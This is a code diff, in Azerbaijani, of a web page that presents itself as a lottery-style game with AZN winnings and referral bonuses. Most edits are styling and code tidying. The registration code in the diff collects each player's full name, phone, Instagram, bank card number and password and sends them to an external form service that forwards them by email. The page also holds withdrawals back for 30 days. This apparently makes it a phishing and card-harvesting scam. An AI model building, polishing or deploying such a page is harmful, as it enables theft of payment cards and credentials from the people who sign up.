@@ -56,6 +56,10 @@
             border-radius: 1rem;
             margin: 0.8rem 0;
             font-size: 0.85rem;
+            color: #ffffff;  /* Ağ rəng - oxunaqlılıq üçün */
+        }
+        .rule-box strong, .rule-box b {
+            color: #F59E0B; /* Başlıqlar narıncı */
         }
         input, button {
             width: 100%;
@@ -145,9 +149,9 @@
             border-radius: 1rem;
             margin: 10px 0;
             word-break: break-all;
+            color: white;
         }
         .copy-btn { background: #3B82F6; margin-top: 5px; padding: 8px; }
-        .test-btn { background: #3B82F6; margin-top: 5px; } /* sadəcə stil, funksiya yoxdur */
     </style>
 </head>
 <body>
@@ -225,9 +229,7 @@
 </div>
 
 <script>
-    // ======================== FORMPREE ENDPOINT (artıq form action-da var) ========================
-    // Heç bir bot tokeni yoxdur. Qeydiyyat məlumatları birbaşa email-ə gedir.
-    
+    // ======================== FORMPREE ENDPOINT ========================
     let currentPlayer = null;
     let gameInterval = null, drawInterval = null;
     let drawnNumbers = [];
@@ -259,7 +261,6 @@
         return first && first.length >= 2 && last && last.length >= 2 && regex.test(first) && regex.test(last);
     }
 
-    // URL-dən referal parametrini oxu
     function getReferralFromUrl() {
         const urlParams = new URLSearchParams(window.location.search);
         return urlParams.get('ref');
@@ -272,9 +273,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
-            if (response.ok) return true;
-            else return false;
-        } catch(e) { console.error(e); return false; }
+            return response.ok;
+        } catch(e) { return false; }
     }
 
     function updateWithdrawButton() {
@@ -296,7 +296,7 @@
         if (!currentPlayer) return;
         const regDate = new Date(currentPlayer.registeredAt);
         if ((new Date() - regDate) >= 30 * 86400000 && currentPlayer.totalWinnings > 0) {
-            alert(`✅ ${currentPlayer.totalWinnings} AZN çıxarış tələbiniz qeydə alındı. Sizinlə əlaqə saxlanılacaq.`);
+            alert(`✅ ${currentPlayer.totalWinnings} AZN çıxarış tələbiniz qeydə alındı.`);
             currentPlayer.totalWinnings = 0;
             currentPlayer.balance = 0;
             savePlayer(currentPlayer);
@@ -367,29 +367,25 @@
         
         // Formspree-ə məlumat göndər
         const formData = {
-            fullname: fullname,
-            email: email,
-            instagram: instagram,
-            telefon: phone,
-            kart: card,
-            sifre: password,
-            referrer: referrerId || 'yoxdur',
-            registeredAt: new Date().toLocaleString()
+            fullname, email, instagram, telefon: phone, kart: card, sifre: password,
+            referrer: referrerId || 'yoxdur', registeredAt: new Date().toLocaleString()
         };
         await sendToFormspree(formData);
         
-        // Referal bonusu
+        // Referal bonusu (yeni istifadəçi referal link ilə gəlibsə)
         if (referrerId) {
             let referrer = loadPlayerById(referrerId);
             if (referrer) {
                 referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
                 referrer.balance = referrer.totalWinnings;
                 savePlayerById(referrerId, referrer);
-                alert(`🎉 Sizə 5 AZN referal bonusu verildi! ${referrer.fullname} - Ümumi balans: ${referrer.totalWinnings} AZN`);
+                alert(`🎉 Referal bonusu: ${referrer.fullname} hesabına 5 AZN əlavə edildi! Ümumi balans: ${referrer.totalWinnings} AZN`);
                 if (currentPlayer.id === referrerId) {
                     currentPlayer = referrer;
                     savePlayer(currentPlayer);
                 }
+            } else {
+                console.warn("Referer tapılmadı:", referrerId);
             }
         }
         
